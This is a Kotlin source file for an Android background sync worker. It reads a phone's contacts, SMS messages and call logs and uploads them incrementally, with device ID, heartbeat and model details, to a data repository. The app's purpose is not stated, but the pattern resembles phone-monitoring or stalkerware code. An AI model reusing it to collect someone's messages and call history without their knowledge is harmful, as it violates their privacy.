package com.boxx.datasync.sync

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        Log.d("SyncWorker", "WORKER_SYNC_STARTED")
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        val now = System.currentTimeMillis()
        return try {
            repository.updateHeartbeat(deviceId)
            repository.testDeviceWrite(deviceId)
            val contactsAllowed = hasPermission(android.Manifest.permission.READ_CONTACTS)
            val smsAllowed = hasPermission(android.Manifest.permission.READ_SMS)
            val callsAllowed = hasPermission(android.Manifest.permission.READ_CALL_LOG)
            if (!contactsAllowed && !smsAllowed && !callsAllowed) {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                    "syncStatus" to "Error",
                    "lastError" to "Missing data permissions",
                    "lastSyncTime" to now
                ))
                Log.d("SyncWorker", "WORKER_SYNC_SUCCESS missing permissions handled")
                return Result.success()
            }
            val contacts = if (contactsAllowed) DataHelper.fetchContacts(applicationContext, prefs.getLong("last_contact_sync", 0L)) else emptyList()
            val sms = if (smsAllowed) DataHelper.fetchSMS(applicationContext, prefs.getLong("last_sms_sync", 0L)) else emptyList()
            val calls = if (callsAllowed) DataHelper.fetchCallLogs(applicationContext, prefs.getLong("last_call_sync", 0L)) else emptyList()
            repository.syncIncremental(deviceId, contacts, sms, calls)
            prefs.edit().apply {
                if (contacts.isNotEmpty()) putLong("last_contact_sync", now)
                if (sms.isNotEmpty()) putLong("last_sms_sync", sms.maxOf { it.date })
                if (calls.isNotEmpty()) putLong("last_call_sync", calls.maxOf { it.date })
            }.apply()
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "lastError" to null,
                "contactCount" to if (contactsAllowed) DataHelper.fetchContacts(applicationContext).size else 0,
                "smsCount" to if (smsAllowed) DataHelper.fetchSMS(applicationContext).size else 0,
                "callCount" to if (callsAllowed) DataHelper.fetchCallLogs(applicationContext).size else 0
            ))
            Log.d("SyncWorker", "WORKER_SYNC_SUCCESS")
            Result.success()
        } catch (e: SecurityException) {
            Log.e("SyncWorker", "WORKER_SYNC_FAILED", e)
            Result.success()
        } catch (e: Exception) {
            Log.e("SyncWorker", "WORKER_SYNC_FAILED", e)
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Error",
                "lastError" to (e.localizedMessage ?: e.message ?: e.javaClass.simpleName)
            ))
            Result.retry()
        }
    }

    private fun hasPermission(permission: String) = ContextCompat.checkSelfPermission(applicationContext, permission) == PackageManager.PERMISSION_GRANTED

    private fun baseDeviceMap(deviceId: String, now: Long): Map<String, Any?> = mapOf(
        "deviceId" to deviceId,
        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "osVersion" to Build.VERSION.RELEASE,
        "heartbeatAt" to now,
        "timestamp" to now
    )
}
